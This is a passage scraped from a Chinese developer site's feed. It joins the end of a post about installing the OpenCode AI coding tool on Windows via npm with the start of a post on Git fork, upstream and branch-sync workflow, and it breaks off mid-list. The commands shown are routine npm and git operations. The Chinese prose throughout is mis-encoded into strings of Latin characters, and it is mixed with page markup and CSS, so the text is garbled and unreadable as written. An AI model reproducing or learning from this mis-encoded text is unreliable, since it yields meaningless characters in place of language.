<p>æŠŠéœ€æ±‚ç®€å•çš„åœ¨å¯¹è¯åŒºè¾“å…¥ä¸€ä¸‹ï¼ŒOpenCode å¤§æ¦‚1åˆ†å¤šé’Ÿå°±å®ç°äº†ï¼Œç”±äºé¡¹ç›®æ˜¯é¦–æ¬¡åœ¨ OpenCode ä¸­æ‰“å¼€ä½¿ç”¨ï¼Œåˆ†æé¡¹ç›®ç»“æ„èŠ±äº†ç‚¹æ—¶é—´ï¼Œå¦‚æœåªæ˜¯åŠŸèƒ½éœ€æ±‚åº”è¯¥ä¼šæ›´å¿«</p>
<p>ç•Œé¢çš„å¯¹è¯ï¼Œä»£ç ç­‰å†…å®¹å‘ˆç°ç­‰è®¾è®¡éå¸¸ç®€æ´ï¼Œæ˜¯æˆ‘å–œæ¬¢çš„ç±»å‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3643fbdab46545bf82b9880665687511~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=%2FeuJomhQPwPTx4WUaE%2B3kVdz2E8%3D" alt="" loading="lazy"/></p>
<p>æ¥çœ‹ä¸‹å®ç°å‡ºæ¥çš„æ•ˆæœï¼Œéå¸¸å¥½ï¼ŒåŠŸèƒ½å®ç°äº†ï¼Œç•Œé¢ä¹Ÿç¬¦åˆé¡¹ç›®çš„è®¾è®¡é£æ ¼ï¼Œç¼ºä¸ªå›¾ç‰‡ï¼Œå®ƒè‡ªå·±å…ˆåŠ äº†ä¸€ä¸ªå›¾å ä½ï¼ŒUIè®¾è®¡è¿˜æ²¡æä¾›å›¾ï¼Œç­‰UIè®¾è®¡æä¾›å›¾äº†ï¼Œå†æ›¿æ¢ä¸‹å°±å¥½äº†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a33ffe4bb38c45f48b016f769f692bdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=0jUeH6i2V%2Fq5Doz03vq90BD8fqs%3D" alt="" loading="lazy"/></p>
<p>ç¥–ä¼ shiå±±é¡¹ç›®ï¼Œä¸çŸ¥é“æ¢äº†å¤šå°‘äººåœ¨ä¸Šé¢æ‹‰shiï¼Œè¿™ç§shiå±±é¡¹ç›®æˆ‘è¿ç›®å½•ç»“æ„éƒ½ä¸æƒ³æ‰“å¼€ï¼Œç›´æ¥è®©OpenCode å»shié‡Œåˆ†æçœ‹ç€æ”¹å§</p>
<p>æ¥ä¸‹æ¥é€šè¿‡è„šæœ¬å®‰è£…ä¸‹ï¼Œæ¯•ç«Ÿæœ‰äº›æ—¶å€™è¿˜æ˜¯éœ€è¦çœ‹ä»£ç çš„ï¼Œåœ¨å…¶ä»–ç¼–è¾‘å™¨ä¸­ä½¿ç”¨ OpenCode çš„èƒ½åŠ›è¿˜æ˜¯éå¸¸æœ‰å¿…è¦çš„</p>
<h2 data-id="heading-3">CLIæ¨¡å¼</h2>
<p>å‰ç«¯åŠæ¯›ï¼Œç›´æ¥ä½¿ç”¨ npm å…¨å±€å®‰è£…</p>
<pre><code class="hljs language-js" lang="js">npm install -g opencode-ai
</code></pre>
<p>è¿™ä¸ªè¿‡ç¨‹ï¼Œç®€å•åˆ°çˆ†ï¼Œå¿«åˆ°é£èµ·</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a68a421199f430b89c622f3ef4b1d47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=bKynsBxTw2PzY4VCekCxsN1qAng%3D" alt="" loading="lazy"/></p>
<p>æˆ‘åœ¨ VSCode ä¸­æ‰“å¼€ï¼Œç«Ÿç„¶æç¤ºæ²¡æœ‰æ­£ç¡®å®‰è£…</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bf23e674ade4b0a9f2492d0a88c437b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=T8vpF1kgy21w00%2FjWbdyaifHeyA%3D" alt="" loading="lazy"/></p>
<p>åœ¨åˆšæ‰ç»ˆç«¯ä½ç½®æ‰§è¡Œ opencode å‘½ä»¤ï¼Œä¹Ÿæç¤ºè¿™ä¸ªé”™è¯¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11af6174276d45fea01dc102db1d847d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=RV9JT7L5eT0jAMQFWxR4RXoif3E%3D" alt="" loading="lazy"/></p>
<p>ä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œwindows ç³»ç»Ÿçš„å¸¸è§æƒ…å†µï¼ŒåŠ¨ä¸åŠ¨å°±å®‰è£…ä¸ªåŒ…è¿™æ¯›ç—…é‚£æ¯›ç—…çš„ï¼Œæä¸“ä¸šAIç›¸å…³è¿˜æ˜¯ç›´æ¥ç”¨MacOSæˆ–ç”¨Linuxç³»ç»Ÿä¼šæ›´å¥½ä¸€ç‚¹</p>
<p>æœä¸€ä¸‹ï¼Œå¤„ç†ä¸€ä¸‹ï¼Œå¸è½½äº†é‡æ–°å®‰è£…å¯¹åº”çš„ windows x64 ç‰ˆæœ¬çš„åŒ…ï¼ŒæŠŠä¸‹é¢çš„å‘½ä»¤æŒ‰é¡ºåºæ‰§è¡Œä¸€é</p>
<pre><code class="hljs language-js" lang="js">    npm uninstall -g opencode-ai

    npm cache clean --force

    npm install -g opencode-windows-x64

    npm install -g opencode-ai
</code></pre>
<p>å†æ¬¡åœ¨ VSCode çš„é¡¹ç›®ç›®å½•ä¸­æ‰“å¼€ opencode, æ­£å¸¸äº†ï¼Œè¿™ä¸ªæå®¢é£ç•Œé¢æˆ‘æ˜¯è¶Šçœ‹è¶Šå–œæ¬¢</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a3a170851bf438483d2ba0d5c0de4df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=y4JawTEdwFUeFqQRWDeXkAiufOY%3D" alt="" loading="lazy"/></p>
<p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ <code>/</code>ï¼Œå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„å‘½ä»¤æç¤ºï¼Œå‘½ä»¤æµçš„ä½¿ç”¨æ–¹å¼ï¼Œéå¸¸å¥½ç”¨</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ce617ea99444cbc866a5dd4af42006c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=hRPhKX%2BNC40ZJlZkDsug2zpQ4hY%3D" alt="" loading="lazy"/></p>
<p>å®˜æ–¹è¿˜å†…ç½®äº†å„ç§å·¥å…·å’Œé…ç½®ï¼Œåœ¨æ¥ä¸‹æ¥çš„æ¬ç –è¿‡ç¨‹ä¸­å†æ…¢æ…¢æ¢ç´¢å§</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b5e4bffbd854bda9f08cb2996ee3510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=J1ZKodmCzjIltpln0fVC6AOU%2F78%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æ¬¢è¿ç•™è¨€äº¤æµï¼Œå¦‚æœè§‰å¾—æœ‰å¸®åŠ©ï¼Œå¯ä»¥<code>ç‚¹ä¸ªèµ</code>æ”¯æŒä¸€ä¸‹</p>
<p>å…¬ä¼—å·ï¼šè‰å¸½lufei</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€æºé¡¹ç›®äºŒæ¬¡å¼€å‘æœ€ä½³å®è·µï¼šFork + åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥]]></title>    <link>https://juejin.cn/post/7592582130594742323</link>    <guid>https://juejin.cn/post/7592582130594742323</guid>    <pubDate>2026-01-08T03:44:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592582130594742323" data-draft-id="7592683699771097098" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€æºé¡¹ç›®äºŒæ¬¡å¼€å‘æœ€ä½³å®è·µï¼šFork + åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥"/> <meta itemprop="keywords" content="Git,å¼€æº"/> <meta itemprop="datePublished" content="2026-01-08T03:44:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Kpç‹¬ç«‹å¼€å‘"/> <meta itemprop="url" content="https://juejin.cn/user/4248168661533565"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€æºé¡¹ç›®äºŒæ¬¡å¼€å‘æœ€ä½³å®è·µï¼šFork + åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248168661533565/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Kpç‹¬ç«‹å¼€å‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:44:32.000Z" title="Thu Jan 08 2026 03:44:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„é—®é¢˜ï¼ŸåŸºäºå¼€æºé¡¹ç›®è¿›è¡ŒäºŒæ¬¡å¼€å‘æ—¶ï¼Œä¸Šæ¸¸é¡¹ç›®é¢‘ç¹æ›´æ–°ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åŒæ­¥ï¼›è‡ªå®šä¹‰ä¿®æ”¹ä¸ä¸Šæ¸¸æ›´æ–°äº§ç”Ÿå†²çªï¼Œç»´æŠ¤æˆæœ¬è¶Šæ¥è¶Šé«˜ï¼›æƒ³è¦æ‰¾åˆ°æ—¢èƒ½è·å–ä¸Šæ¸¸æ›´æ–°ï¼Œåˆèƒ½ç‹¬ç«‹ç®¡ç†è‡ªå®šä¹‰ä¿®æ”¹çš„æ–¹æ¡ˆã€‚</p>
<p>æœ¬æ–‡å°†è¯¦ç»†ä»‹ç» Fork + ä¸Šæ¸¸ä»“åº“ç®¡ç† + åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥çš„å®Œæ•´æ–¹æ¡ˆï¼Œå¸®åŠ©ä½ è§£å†³å¼€æºé¡¹ç›®äºŒæ¬¡å¼€å‘ä¸­çš„åŒæ­¥æ›´æ–°å’Œè‡ªå®šä¹‰ä¿®æ”¹ç®¡ç†é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">æ ¸å¿ƒæµç¨‹ï¼šFork + ä¸Šæ¸¸ä»“åº“ç®¡ç†</h2>
<h3 data-id="heading-1">1. æ´¾ç”Ÿï¼ˆForkï¼‰åŸå¼€æºä»“åº“</h3>
<p>åœ¨ä»£ç æ‰˜ç®¡å¹³å°ï¼ˆå¦‚ GitHub/Giteeï¼‰ä¸Šç‚¹å‡» Fork æŒ‰é’®ï¼Œå°†åŸå¼€æºä»“åº“å¤åˆ¶åˆ°è‡ªå·±çš„è´¦å·ä¸‹ï¼Œå½¢æˆä¸€ä¸ª<strong>æ´¾ç”Ÿä»“åº“</strong>ï¼ˆå¦‚ <code>your-username/your-repo-fork</code>ï¼‰ã€‚</p>
<p>æ´¾ç”Ÿä»“åº“æ˜¯äºŒæ¬¡å¼€å‘çš„èµ·ç‚¹ï¼Œä¸åŸä»“åº“ï¼ˆä¸Šæ¸¸ï¼‰éš”ç¦»ï¼Œé¿å…ç›´æ¥ä¿®æ”¹åŸé¡¹ç›®ã€‚</p>
<h3 data-id="heading-2">2. æœ¬åœ°ä»“åº“é…ç½®ï¼šæ·»åŠ ä¸Šæ¸¸ï¼ˆUpstreamï¼‰è¿œç¨‹</h3>
<p>å…‹éš†æ´¾ç”Ÿä»“åº“åˆ°æœ¬åœ°ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/your-username/your-repo-fork.git
<span class="hljs-built_in">cd</span> your-repo-fork
</code></pre>
<p>æ·»åŠ åŸå¼€æºä»“åº“ä¸ºä¸Šæ¸¸è¿œç¨‹ï¼ˆå‘½åä¸º <code>upstream</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">git remote <span class="hljs-keyword">add</span> upstream https:<span class="hljs-comment">//github.com/original-owner/original-repo.git</span>
</code></pre>
<p>éªŒè¯è¿œç¨‹é…ç½®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git remote -v
<span class="hljs-comment"># è¾“å‡ºåº”åŒ…å« originï¼ˆä½ çš„æ´¾ç”Ÿä»“åº“ï¼‰å’Œ upstreamï¼ˆåŸä»“åº“ï¼‰</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/448c66f4126f4b6ea2afdea72f137df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS3Dni6znq4vlvIDlj5E=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448800&amp;x-signature=ju2dd4ljKn%2Bf%2FYa3d80mGd%2B8qCs%3D" alt="Fork å·¥ä½œæµç¨‹å›¾" loading="lazy"/></p>
<p>Fork å·¥ä½œæµç¨‹å›¾</p>
<p>Fork å·¥ä½œæµç¨‹å›¾ï¼Œå±•ç¤ºä»åŸå¼€æºä»“åº“ Fork åˆ°æ´¾ç”Ÿä»“åº“ï¼Œå†åˆ°æœ¬åœ°ä»“åº“é…ç½®ä¸Šæ¸¸è¿œç¨‹çš„å®Œæ•´æµç¨‹ã€‚</p>
<h2 data-id="heading-3">äºŒæ¬¡å¼€å‘å·¥ä½œæµï¼šåˆ†æ”¯éš”ç¦»ä¸åŒæ­¥</h2>
<p>éµå¾ª<strong>å•å‘æ•°æ®æµ</strong>æ ¸å¿ƒè§„åˆ™ï¼š<code>upstream/main â†’ origin/main â†’ feature/new-function</code>ï¼Œä¿éšœåˆ†æ”¯å†å²å¯è¿½æº¯ã€‚</p>
<h3 data-id="heading-4">1. åˆ†æ”¯åˆå§‹åŒ–ï¼šä» origin/main æ‹‰å– feature/new-function</h3>
<pre><code class="hljs language-javascript" lang="javascript"># åˆ‡æ¢å¹¶æ›´æ–°æœ¬åœ° main åˆ†æ”¯
git checkout main
git pull origin main

# åŸºäºæœ€æ–°æœ¬åœ° main åˆ†æ”¯ï¼Œåˆ›å»ºå¹¶åˆ‡æ¢åˆ° feature/<span class="hljs-keyword">new</span>-<span class="hljs-keyword">function</span> åˆ†æ”¯
git checkout -b feature/<span class="hljs-keyword">new</span>-<span class="hljs-keyword">function</span>

# ï¼ˆå¯é€‰ï¼‰æ¨é€æ–°åˆ†æ”¯åˆ°è¿œç¨‹ origin ä»“åº“
git push -u origin feature/<span class="hljs-keyword">new</span>-<span class="hljs-keyword">function</span>
</code></pre>
<h3 data-id="heading-5">2. upstream/main ä¸ origin/main å•å‘åŒæ­¥</h3>
<pre><code class="hljs language-css" lang="css"># åˆ‡æ¢åˆ°æœ¬åœ° <span class="hljs-selector-tag">main</span> åˆ†æ”¯ï¼Œæ‹‰å– upstream/<span class="hljs-selector-tag">main</span> æœ€æ–°ä»£ç 
git checkout <span class="hljs-selector-tag">main</span>
git fetch upstream <span class="hljs-selector-tag">main</span>

# ä½¿ç”¨ merge æ“ä½œå°† upstream/<span class="hljs-selector-tag">main</span> åˆå¹¶åˆ°æœ¬åœ° <span class="hljs-selector-tag">main</span> åˆ†æ”¯
git merge upstream/<span class="hljs-selector-tag">main</span>
# å†²çªå¤„ç†ï¼šä¿®æ”¹å†²çªæ–‡ä»¶ â†’ git add &lt;å†²çªæ–‡ä»¶&gt; â†’ git commit

# æ¨é€è‡³ origin/<span class="hljs-selector-tag">main</span>
git push origin <span class="hljs-selector-tag">main</span>
</code></pre>
<h3 data-id="heading-6">3. origin/main ä¸ feature/new-function å•å‘åŒæ­¥</h3>
<pre><code class="hljs language-sql" lang="sql"># åˆ‡æ¢åˆ° feature<span class="hljs-operator">/</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span><span class="hljs-keyword">function</span> å¼€å‘åˆ†æ”¯
git checkout feature<span class="hljs-operator">/</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span><span class="hljs-keyword">function</span>

# æ‹‰å– origin<span class="hljs-operator">/</span>main æœ€æ–°ä»£ç ï¼Œé€šè¿‡ <span class="hljs-keyword">merge</span> åˆå¹¶åˆ°å½“å‰å¼€å‘åˆ†æ”¯
git <span class="hljs-keyword">fetch</span> origin main
git <span class="hljs-keyword">merge</span> origin<span class="hljs-operator">/</span>main
# å†²çªå¤„ç†ï¼šä¿®æ”¹å†²çªæ–‡ä»¶ â†’ git <span class="hljs-keyword">add</span> <span class="hljs-operator">&lt;</span>å†²çªæ–‡ä»¶<span class="hljs-operator">&gt;</span> â†’ git <span class="hljs-keyword">commit</span>

# å®Œæˆæµ‹è¯•åæ¨é€è‡³è¿œç¨‹ feature<span class="hljs-operator">/</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span><span class="hljs-keyword">function</span> åˆ†æ”¯
git push origin feature<span class="hljs-operator">/</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span><span class="hljs-keyword">function</span>
</code></pre>
<h3 data-id="heading-7">4. æ ¸å¿ƒæ³¨æ„äº‹é¡¹</h3>
<ul>
<li><strong>ä¸¥æ ¼éµå®ˆå•å‘æ•°æ®æµ</strong>ï¼šä»…å…è®¸ <code>upstream/main â†’ origin/main â†’ feature/new-function</code>ï¼Œç¦æ­¢åå‘åŒæ­¥æˆ–è·¨çº§åŒæ­¥</li>
<li><strong>å†²çªå¤„ç†</strong>ï¼šç”±å¯¹åº”åˆ†æ”¯è´Ÿè´£äººæ“ä½œï¼Œç»“åˆä¸šåŠ¡é€»è¾‘åˆ¤æ–­ä»£ç ä¼˜å…ˆçº§ï¼Œè§£å†³åå¿…é¡»æœ¬åœ°æµ‹è¯•éªŒè¯</li>
<li><strong>å®šæœŸåŒæ­¥</strong>ï¼šå»ºè®®æ¯æ—¥åŒæ­¥ <code>origin/main</code> åˆ°å¼€å‘åˆ†æ”¯ï¼Œæ¯å‘¨åŒæ­¥ <code>upstream/main</code> åˆ° <code>origin/main</code>ï¼Œå‡å°‘å†²çªç§¯ç´¯</li>
<li><strong>åˆå¹¶æµç¨‹</strong>ï¼šå¼€å‘å®Œæˆåï¼Œéœ€é€šè¿‡ PR/MR æµç¨‹å°† <code>feature/new-function</code> åˆå¹¶åˆ° <code>origin/main</code>ï¼Œç¦æ­¢ç›´æ¥æ¨é€</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9f25f44134346a2af8355f9e885d3c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS3Dni6znq4vlvIDlj5E=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448800&amp;x-signature=V%2FGXPuwVsJwCEIRFKr9mmfEfBis%3D" alt="åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥å·¥ä½œæµç¨‹å›¾" loading="lazy"/></p>
<p>åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥å·¥ä½œæµç¨‹å›¾</p>
<p>åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥å·¥ä½œæµç¨‹å›¾ï¼Œå±•ç¤ºå•å‘æ•°æ®æµè§„åˆ™ï¼ˆupstream/main â†’ origin/main â†’ feature/new-functionï¼‰å’Œä¸‰ä¸ªåˆ†æ”¯çš„åŒæ­¥å…³ç³»ã€‚</p>
<h2 data-id="heading-8">å¯è§†åŒ–ç®¡ç†è½¯ä»¶æ¨è</h2>
<h3 data-id="heading-9">Sourcetree</h3>
<ul>
<li><strong>å¹³å°æ”¯æŒ</strong>ï¼šMacã€Windows</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå¼ºå¤§çš„ Git å¯è§†åŒ–è½¯ä»¶</li>
<li><strong>åŠŸèƒ½</strong>ï¼šæ”¯æŒç®€æ˜“ç®¡ç†æœ¬åœ°åˆ†æ”¯ã€è¿œç«¯ä»“åº“ï¼ˆå¤šä¸ªï¼‰ã€è¿œç«¯åˆ†æ”¯ï¼Œä»¥åŠå„åˆ†æ”¯åŒæ­¥å·¥ä½œ</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c5a7b0cb49a48fbb323ccc633c84310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS3Dni6znq4vlvIDlj5E=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448800&amp;x-signature=rAelc%2ByMgvoYiH4XAXHsm2ZP0Jk%3D" alt="Sourcetree ç¤ºä¾‹" loading="lazy"/></p>
<p>Sourcetree ç¤ºä¾‹</p>
<p>Sourcetree ç¤ºä¾‹æˆªå›¾ï¼Œå±•ç¤ºå¦‚ä½•ç®€æ˜“ç®¡ç†æœ¬åœ°åˆ†æ”¯ã€è¿œç«¯ä»“åº“ï¼ˆå¤šä¸ªï¼‰ã€è¿œç«¯åˆ†æ”¯ï¼Œä»¥åŠå„åˆ†æ”¯åŒæ­¥å·¥ä½œã€‚</p>
<h3 data-id="heading-10">å¼€å‘å·¥å…· Git æ’ä»¶</h3>
<p>å¼€å‘å·¥å…·ï¼ˆå¦‚ IDEAï¼‰çš„ Git æ’ä»¶åŒæ ·ä¹Ÿå¯ä»¥å®ç°å¯è§†åŒ–ç®¡ç†ã€‚</p>
<h2 data-id="heading-11">å®é™…é¡¹ç›®ä¸­çš„å…·ä½“å®è·µæ¡ˆä¾‹</h2>
<h3 data-id="heading-12">æ¡ˆä¾‹é¡¹ç›®</h3>
<ul>
